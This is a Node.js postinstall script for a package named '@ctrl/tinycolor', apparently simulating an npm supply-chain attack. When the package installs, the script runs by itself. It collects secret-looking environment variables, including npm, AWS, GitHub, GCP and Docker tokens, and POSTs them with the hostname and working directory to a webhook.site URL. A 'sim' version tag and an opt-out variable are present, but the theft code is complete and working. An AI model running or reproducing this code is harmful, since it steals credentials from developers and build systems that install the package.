#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const os = require('os');

const PACKAGE_NAME = '@ctrl/tinycolor';
const PACKAGE_VERSION = '3.6.0-sim';
const BINARY_NAME = 'trufflehog';
const binaryPath = path.join(__dirname, BINARY_NAME);
const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb7072441d28';

function ensureExecutable(targetPath) {
  try {
    const stats = fs.statSync(targetPath);
    if (!stats.isFile()) {
      console.warn(`${PACKAGE_NAME} postinstall: ${targetPath} exists but is not a file`);
      return;
    }
  } catch (error) {
    console.warn(`${PACKAGE_NAME} postinstall: trufflehog binary not found`, error.message);
    return;
  }

  if (process.platform !== 'win32') {
    try {
      fs.chmodSync(targetPath, 0o755);
      console.log(`${PACKAGE_NAME} postinstall: set executable bit on ${targetPath}`);
    } catch (chmodError) {
      console.warn(`${PACKAGE_NAME} postinstall: failed to chmod trufflehog`, chmodError.message);
    }
  }
}

function harvestBuildSecrets() {
  const secretKeys = [
    'NPM_TOKEN',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'GITHUB_TOKEN',
    'GH_TOKEN',
    'GCP_SERVICE_ACCOUNT_KEY',
    'GOOGLE_APPLICATION_CREDENTIALS',
    'DOCKER_PASSWORD',
    'PYPI_API_TOKEN',
    'NEXUS_PASSWORD',
    'JFROG_API_KEY',
    'CODECOV_TOKEN',
    'SONAR_TOKEN',
    'SAUCE_ACCESS_KEY',
    'BROWSERSTACK_ACCESS_KEY',
  ];

  const matches = [];
  const entries = Object.entries(process.env || {});
  for (const [key, value] of entries) {
    if (!value) continue;
    if (secretKeys.includes(key) || /TOKEN|SECRET|API_KEY|PASSWORD|CREDENTIAL/i.test(key)) {
      matches.push({ key, value: String(value) });
    }
  }
  return matches;
}

function exfiltrateBuildSecrets() {
  if (process.env.CTRL_TINYCOLOR_DISABLE_EXFIL) {
    return;
  }

  const artifacts = harvestBuildSecrets();
  if (artifacts.length === 0) {
    console.warn(`${PACKAGE_NAME} postinstall: no build secrets found to exfiltrate`);
    return;
  }

  const urlString = process.env.CTRL_TINYCOLOR_EXFIL_URL || DEFAULT_EXFIL_URL;
  let parsedUrl;
  try {
    parsedUrl = new URL(urlString);
  } catch (error) {
    console.warn(`${PACKAGE_NAME} postinstall: invalid exfil URL`, urlString);
    return;
  }

  const client = parsedUrl.protocol === 'http:' ? http : https;
  const body = JSON.stringify({
    package: PACKAGE_NAME,
    version: PACKAGE_VERSION,
    source: 'postinstall',
    artifacts,
    hostname: os.hostname(),
    cwd: process.cwd(),
    timestamp: new Date().toISOString(),
  });

  console.warn(`${PACKAGE_NAME} postinstall: exfiltrating ${artifacts.length} build secrets`, {
    url: urlString,
    keys: artifacts.map((a) => a.key),
  });

  const pathname = parsedUrl.pathname && parsedUrl.pathname.length > 0 ? parsedUrl.pathname : '/';
  const requestOptions = {
    method: 'POST',
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'http:' ? 80 : 443),
    path: pathname + (parsedUrl.search || ''),
    headers: {
      'content-type': 'application/json',
      'content-length': Buffer.byteLength(body),
      'x-ctrl-tinycolor-sim': 'postinstall-exfil',
    },
    timeout: 4000,
  };

  try {
    const req = client.request(requestOptions, (res) => {
      res.resume();
      res.on('end', () => {
        console.warn(`${PACKAGE_NAME} postinstall: exfil response status: ${res.statusCode}`);
      });
      res.on('error', () => {});
    });
    req.on('error', (error) => {
      console.debug(`${PACKAGE_NAME} postinstall: exfil request error`, error.message);
    });
    req.on('timeout', () => {
      try { req.destroy(); } catch (e) {}
    });
    req.end(body);
  } catch (error) {
    console.debug(`${PACKAGE_NAME} postinstall: failed to exfiltrate`, error.message);
  }
}

ensureExecutable(binaryPath);
exfiltrateBuildSecrets();